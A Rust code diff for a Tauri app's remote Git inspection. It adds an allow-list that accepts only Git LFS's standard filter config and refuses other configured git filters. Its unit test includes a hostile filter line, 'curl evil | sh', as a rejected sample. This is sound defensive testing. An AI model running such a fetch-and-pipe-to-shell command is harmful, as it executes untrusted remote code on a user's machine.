@@ -15,7 +15,7 @@ use std::{
 };
 use tauri::{State, WebviewWindow};
 use tokio::sync::Semaphore;
-fn failed() -> String {
+pub(super) fn failed() -> String {
     "The host could not safely read this Studio item.".into()
 }
 fn gate() -> Arc<Semaphore> {
@@ -39,7 +39,7 @@ pub(super) async fn blocking<T: Send + 'static>(
     .map_err(|_| failed())?
     .map_err(|_| failed())?
 }
-fn main(window: &WebviewWindow) -> Result<(), String> {
+pub(super) fn main(window: &WebviewWindow) -> Result<(), String> {
     hostbridge::window_is_host(window).map_err(|_| failed())
 }
 #[tauri::command]
@@ -78,7 +78,7 @@ pub(crate) async fn remote_studio_files_list(
     })
     .await
 }
-fn git(
+pub(super) fn git(
     read: &crate::project_git::GitReadOperation,
     root: &Anchor,
     args: &[&str],
@@ -108,7 +108,19 @@ fn git(
     }
     Ok((output.stdout, truncated))
 }
-fn git_root(read: &crate::project_git::GitReadOperation, root: &Anchor) -> Result<(), String> {
+/// Git LFS's own install writes exactly these four lines to the user's global
+/// config, so refusing them would turn remote Git off wherever LFS is installed.
+/// Only this exact text passes: any other filter, or any changed command, doesn't.
+fn only_standard_lfs(config: &str) -> bool {
+    const STANDARD: [&str; 4] = [
+        "filter.lfs.clean git-lfs clean -- %f",
+        "filter.lfs.smudge git-lfs smudge -- %f",
+        "filter.lfs.process git-lfs filter-process",
+        "filter.lfs.required true",
+    ];
+    config.lines().all(|line| STANDARD.contains(&line.trim_end()))
+}
+pub(super) fn git_root(read: &crate::project_git::GitReadOperation, root: &Anchor) -> Result<(), String> {
     let (bytes, truncated) = git(read, root, &["rev-parse", "--show-toplevel"], 8192)?;
     if truncated {
         return Err(failed());
@@ -135,7 +147,9 @@ fn git_root(read: &crate::project_git::GitReadOperation, root: &Anchor) -> Resul
     let (output, truncated) = read
         .bounded_output(&root.git_cwd(), &args, 16384)
         .map_err(|_| failed())?;
-    if truncated || output.status.code() != Some(1) {
+    let harmless = output.status.code() == Some(1)
+        || output.status.success() && only_standard_lfs(&String::from_utf8_lossy(&output.stdout));
+    if truncated || !harmless {
         return Err(
             "Remote Git inspection is unavailable for repositories with configured file filters."
                 .into(),
@@ -417,4 +431,15 @@ pub(crate) async fn remote_studio_file_preview(
         Ok(json!({"text":text,"binary":binary,"truncated":truncated}))
     })
     .await
+}
+
+#[cfg(test)]
+mod tests {
+    use super::only_standard_lfs;
+    #[test]
+    fn only_the_exact_lfs_install_counts_as_harmless() {
+        assert!(only_standard_lfs("filter.lfs.clean git-lfs clean -- %f\nfilter.lfs.smudge git-lfs smudge -- %f\nfilter.lfs.process git-lfs filter-process\nfilter.lfs.required true\n"));
+        assert!(!only_standard_lfs("filter.lfs.clean sh -c 'curl evil | sh'\n"));
+        assert!(!only_standard_lfs("filter.lfs.clean git-lfs clean -- %f\nfilter.x.clean ./run\n"));
+    }
 }
